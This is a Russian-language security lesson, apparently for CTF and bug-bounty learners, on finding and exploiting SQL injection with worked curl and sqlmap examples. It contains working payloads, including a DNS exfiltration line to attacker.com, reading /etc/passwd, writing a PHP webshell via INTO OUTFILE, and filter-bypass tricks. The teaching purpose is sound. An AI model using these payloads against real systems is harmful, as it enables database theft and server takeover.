---
id: web-sqli
title: "SQL-инъекции: от кавычки до дампа базы"
category: web
parent: web-recon-attack-entry
difficulty: medium
order: 2
tags: [sqli, sql, union, blind, sqlmap, database]
prerequisites: [web-recon-fuzzing]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Как находить, подтверждать и эксплуатировать SQL-инъекции: UNION, boolean/time-blind, sqlmap, обход фильтров."
---
SQL-инъекция (SQLi) — это внедрение SQL-кода через данные, которые приложение подставляет в запрос без параметризации. Классический пример: форма логина делает `SELECT * FROM users WHERE login='$login' AND pass='$pass'`, и если в поле ввести `' OR 1=1-- -`, проверка пароля отключается. SQLi — одна из самых «дорогих» уязвимостей: она даёт чтение всей базы, иногда запись файлов и RCE. Этот урок — от кавычки до дампа: виды инъекций, ручная эксплуатация, sqlmap и обход фильтров.

## Теория: почему возникает и какие бывают виды

Причина одна: **смешение кода и данных**. Запрос собирается конкатенацией строки, и ввод пользователя меняет его структуру. Правильное решение — параметризованные запросы (prepared statements), где ввод передаётся отдельно и не может изменить структуру.

Виды SQLi:

| Вид | Как проявляется | Как вытаскивать данные |
|-----|-----------------|------------------------|
| In-band (union) | данные видны в ответе | `UNION SELECT` |
| Error-based | ошибка БД содержит данные | `extractvalue`/`updatexml`/`cast` |
| Boolean-blind | ответ «есть/нет» | посимвольные true/false |
| Time-blind | задержка ответа | `SLEEP()`/`pg_sleep`/`WAITFOR` |
| OOB | внешний запрос | DNS/HTTP через `LOAD_FILE`/`UTL_HTTP` |
| Second-order | данные из БД попадают в запрос позже | сохранить, потом триггернуть |

Первые два дают данные сразу; blind/OOB — когда ответ не меняется. Выбор техники зависит от того, что видно в ответе.

## Как определить СУБД

Разные СУБД требуют разного синтаксиса. Быстрые пробы:

```sql
-- MySQL/MariaDB
' AND SLEEP(5)-- -
' UNION SELECT @@version--
-- PostgreSQL
'; SELECT pg_sleep(5)-- -
-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
-- Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

Строка комментария тоже зависит от СУБД: `-- -` (MySQL), `#`, `/* */`. Символ конкатенации: MySQL `CONCAT()`, MSSQL `+`, PostgreSQL `||`, Oracle `||`.

## Инструменты: sqlmap и ручные запросы

**sqlmap** — автоматизированный эксплуататор. Ключевые флаги:

| Флаг | Значение |
|------|----------|
| `-u URL` | целевой URL |
| `-r request.txt` | запрос из файла (Burp-сохранённый) |
| `-p param` | какой параметр тестировать |
| `--cookie` / `-H` | авторизация/заголовки |
| `--batch` | без интерактива |
| `--dbs` | список баз |
| `-D db --tables` | таблицы базы |
| `-T tbl --columns` | колонки таблицы |
| `--dump` | выгрузить данные |
| `--technique=BEUSTQ` | какие техники применять |
| `--level` / `--risk` | глубина/риск (1-5, 1-3) |
| `--tamper=...` | обход WAF |
| `--os-shell` / `--file-read` | RCE/чтение файлов (если права) |
| `--dbms` | явно указать СУБД (ускоряет) |

```bash
# базовый прогон по URL
sqlmap -u 'https://app.example/item?id=1' --batch --dbs
# по сохранённому запросу (с cookie/заголовками)
sqlmap -r req.txt -p id --batch --technique=U --dump
# вытащить конкретную таблицу
sqlmap -u 'https://app.example/?id=1' -D shop -T users --columns --dump
```

Ручные запросы нужны, когда sqlmap «не видит» точку или когда надо точечно подтвердить инъекцию.

## Разобранный пример 1: ручная union-based инъекция

Цель: `https://app.example/news?id=1` возвращает статью.

```bash
# 1. определяем число колонок
curl -s 'https://app.example/news?id=1 ORDER BY 3-- -'   # OK
curl -s 'https://app.example/news?id=1 ORDER BY 4-- -'   # ошибка -> 3 колонки
# 2. находим выводимую колонку
curl -s "https://app.example/news?id=-1 UNION SELECT 1,2,3-- -"
# в ответе видно, что выводятся 2 и 3
# 3. вытаскиваем версию и базу
curl -s "https://app.example/news?id=-1 UNION SELECT 1,@@version,database()-- -"
# 4. таблицы
curl -s "https://app.example/news?id=-1 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -"
```

`ORDER BY N` — это способ **определить число колонок**: увеличиваем N, пока запрос не упадёт. Без этого `UNION` не сойдётся по количеству полей.

## Разобранный пример 2: sqlmap end-to-end

```bash
# 1. сохраняем запрос из Burp в req.txt
# 2. подтверждаем инъекцию
sqlmap -r req.txt -p id --batch --technique=U
#   [INFO] GET parameter 'id' is vulnerable
# 3. перечисляем базы
sqlmap -r req.txt -p id --batch --dbs
#   [*] information_schema
#   [*] shop
# 4. таблицы и дамп
sqlmap -r req.txt -p id -D shop -T users --dump
#   admin | 5f4dcc3b5aa765d61d8327deb882cf99
```

Артефакт — дамп таблицы `users` с хешами паролей. Это доказательство уровня «confirmed».

## Разобранный пример 3: time-based blind

Когда ответ не меняется вообще, работает только задержка:

```bash
# определяем длину имени базы (MySQL)
curl -s -o /dev/null -w '%{time_total}\n' \
  "https://app.example/?id=1 AND IF(LENGTH(database())=4,SLEEP(3),0)-- -"
# 3.0 -> длина 4
# посимвольное извлечение
curl -s -o /dev/null -w '%{time_total}\n' \
  "https://app.example/?id=1 AND IF(SUBSTRING(database(),1,1)='s',SLEEP(3),0)-- -"
```

Каждый «медленный» ответ = true. Так вытаскивают данные посимвольно. Это медленно — используйте sqlmap с `--technique=T`, он автоматизирует бинарный поиск.

## Разобранный пример 4: second-order и OOB

**Second-order**: приложение сохраняет ввод (например, имя пользователя) в БД, а позже подставляет его в другой запрос без параметризации. Проверяется «отложенно»: зарегистрируйте пользователя с именем `admin'-- -`, затем зайдите в раздел, где это имя попадает в запрос.

**OOB** (MySQL, при `FILE`-правах): заставить БД сделать внешний запрос:

```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\a'))-- -
```

Приложение вернёт ошибку, а вы увидите DNS-запрос к `shop.attacker.com` — это и есть exfil. OOB нужен, когда ни ответ, ни время не помогают (например, асинхронная обработка).

## Обход фильтров (когда простые payload не проходят)

- **Кавычки запрещены** → используйте hex/`CHAR()`: вместо `'admin'` пишите `0x61646d696e` или `CHAR(97,100,109,105,110)`.
- **Пробелы запрещены** → `/**/`, `%09`, `%0a`, `()+`.
- **`UNION SELECT` фильтруется** → `UNION/**/SELECT`, регистр `UnIoN`, `UNION%0aSELECT`.
- **Ключевые слова по чёрному списку** → `SEL/**/ECT`, `/*!50000UNION*/`.
- **`--` не работает** → `#` или `/* */`.
- **WAF** → `sqlmap --tamper=space2comment,between,randomcase` (подробнее — `web-waf-bypass`).

```bash
sqlmap -r req.txt --tamper=space2comment,randomcase --batch --dbs
```

## Типичные ошибки новичков

- **Забыть про число колонок.** `UNION` не сработает без совпадения количества полей.
- **Не определить СУБД.** Синтаксис `SLEEP`/`pg_sleep`/`WAITFOR` различается.
- **Путать `-- -` и `--`.** В MySQL нужен пробел после `--`, иначе комментарий не сработает.
- **Считать, что «нет ошибки = нет SQLi».** Blind/OOB не дают ошибок.
- **Игнорировать `-p`.** sqlmap может тестировать не тот параметр.
- **Высокий `--risk` на проде.** Может изменить/удалить данные — только с согласия.
- **Путать SQLi и NoSQLi.** У MongoDB другой синтаксис (`web-nosql-injection`).

## Что делать дальше / решение

1. Найдите параметр, влияющий на запрос (фаззинг `'`, `"`, `)`).
2. Определите СУБД по пробе задержки/версии.
3. Выберите технику: union → error → boolean → time → OOB.
4. Для union — определите число колонок (`ORDER BY`) и выводимые поля.
5. Автоматизируйте sqlmap с `-r req.txt -p <param>`, при WAF — `--tamper`.
6. Доведите до **дампа** (артефакт) или `--os-shell` (если права).
7. Тупик → second-order, OOB или смежная NoSQLi/LDAP-инъекция.

## Справочная таблица

| Задача | Payload/флаг |
|--------|--------------|
| число колонок | `ORDER BY N-- -` |
| найти выводимую колонку | `UNION SELECT 1,2,3-- -` |
| версия (MySQL) | `@@version` |
| текущая база | `database()` |
| таблицы | `information_schema.tables` |
| колонки | `information_schema.columns` |
| задержка (MySQL) | `SLEEP(5)` |
| задержка (MSSQL) | `WAITFOR DELAY '0:0:5'` |
| задержка (Postgres) | `pg_sleep(5)` |
| дамп sqlmap | `--dump` |
| обход WAF | `--tamper=...` |
## SQLi в разных контекстах

Инъекция зависит от того, **куда** попадает ввод. Полезно держать в голове типовые контексты и их «обёртки»:

| Контекст | Пример запроса | Обёртка payload |
|----------|----------------|-----------------|
| Строка | `WHERE name='$x'` | `' OR 1=1-- -` |
| Число | `WHERE id=$x` | `1 OR 1=1` (без кавычек) |
| LIKE | `WHERE n LIKE '%$x%'` | `%' OR 1=1-- -` |
| IN | `WHERE id IN ($x)` | `1) OR 1=1-- -` |
| ORDER BY | `ORDER BY $x` | `1,(SELECT...)` |
| LIMIT | `LIMIT $x` | `1,1 UNION SELECT...` |
| JSON-путь | `data->>'$.$x'` | `x' OR '1'='1` |

Ошибка новичка — использовать строковую обёртку в числовом контексте (и наоборот). Если `1'` даёт ошибку, а `1` меняет логику — контекст числовой, кавычки не нужны.

## Разобранный пример: error-based (MySQL)

Когда приложение показывает ошибки БД, данные можно вытащить прямо в тексте ошибки:

```bash
# имя базы в ошибке через extractvalue
curl -s "https://t/?id=1 AND extractvalue(1,concat(0x7e,database()))-- -"
# XPATH syntax error: '~shop'
# таблицы
curl -s "https://t/?id=1 AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- -"
```

`extractvalue`/`updatexml` ограничены 32 символами на вызов, поэтому длинные значения режутся на части через `SUBSTRING`. Это быстрее blind и не требует `UNION`.

## Разобранный пример: определение прав и RCE

Если у пользователя БД есть права `FILE` и `INSERT`, можно читать/писать файлы, а иногда получить RCE:

```bash
# проверка прав
sqlmap -r req.txt --privileges --batch
# чтение файла
sqlmap -r req.txt --file-read=/etc/passwd --batch
# запись webshell (MySQL, если есть FILE и известен webroot)
curl -s "https://t/?id=1 UNION SELECT '<?php system(\$_GET[0]); ?>' INTO OUTFILE '/var/www/html/s.php'-- -"
```

MSSQL через `xp_cmdshell`, PostgreSQL через `COPY ... TO PROGRAM` — см. `svc-database`. Помните: запись файлов — это уже RCE-уровень, требует согласия и осторожности.

## Чек-лист тестирования SQLi

1. **Фаззинг.** Подайте `'`, `"`, `)`, `;`, `\` и следите за кодами/ошибками.
2. **Классификация.** Числовой или строковый контекст; виден ли вывод.
3. **СУБД.** Пробой `SLEEP`/`pg_sleep`/`WAITFOR`/`dbms_pipe`.
4. **Техника.** union → error → boolean → time → OOB.
5. **Колонки.** `ORDER BY` до падения; найдите выводимые поля.
6. **Данные.** `information_schema` → таблицы → колонки → дамп.
7. **Привилегии.** `FILE`, `xp_cmdshell`, `COPY TO PROGRAM`.
8. **Фильтры.** Кодировки, комментарии, hex/`CHAR()`, tamper.
9. **Second-order.** Сохранить → триггернуть в другом месте.
10. **Артефакт.** Дамп canary-строки как доказательство.

## Смежные темы

- **`web-nosql-injection`** — MongoDB/`$ne`/`$where`, другой синтаксис.
- **`web-orm-injection`** — инъекция через ORM (HQL/JPQL, `$where`).
- **`web-ldap-injection`**, **`web-xpath-injection`** — инъекции в других языках запросов.
- **`web-waf-bypass`** — если payload блокируется.
- **`svc-database`** — прямая атака на СУБД (UDF, `xp_cmdshell`).

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что означает `' OR 1=1-- -` в поле логина?"
  options:
    - "Всегда вернёт пустой результат"
    - "Сделает условие WHERE всегда истинным, обходя пароль"
    - "Сломает БД"
    - "Это XSS"
  answer: 1
  explanation: "Классический обход аутентификации."
- question: "Для чего используется `ORDER BY N` при SQLi?"
  options:
    - "Для сортировки результатов"
    - "Для определения числа колонок в запросе"
    - "Для создания таблицы"
    - "Для шифрования"
  answer: 1
  explanation: "Ошибка на N+1 говорит о N колонках."
- question: "Какая техника нужна, если ответ сервера вообще не меняется, но данные надо вытащить?"
  options:
    - "UNION-based"
    - "Error-based"
    - "Time-based blind (или out-of-band)"
    - "Reflected XSS"
  answer: 2
  explanation: "Задержки позволяют вытягивать данные побитово."
- question: "Что делает флаг `--dbs` у sqlmap?"
  options:
    - "Дамп всех таблиц"
    - "Перечисление баз данных"
    - "Запуск OS shell"
    - "Отключение WAF"
  answer: 1
  explanation: "`--dbs` — список баз."
- question: "Как обойти фильтр, запрещающий кавычки, при дампе строки 'admin'?"
  options:
    - "Использовать `0x61646d696e` (hex)"
    - "Использовать `'admin'` с двойными кавычками"
    - "Никак"
    - "Добавить пробел"
  answer: 0
  explanation: "Hex-литералы заменяют строковые."
```

## Где пригодится

- **CTF (Web):** SQLi — топ-класс задач; флаг часто в отдельной таблице или файле, читаемом через БД.
- **Bug bounty:** SQLi критичны и оплачиваются максимально; даже blind-инъекция — валидный high/critical.
- **Пентест:** тестирование всех параметров на SQLi входит в обязательный чеклист (OWASP A03: Injection).
- **Работа (AppSec):** ревью кода на конкатенацию SQL и внедрение ORM/prepared statements — прямая защита от этого класса.
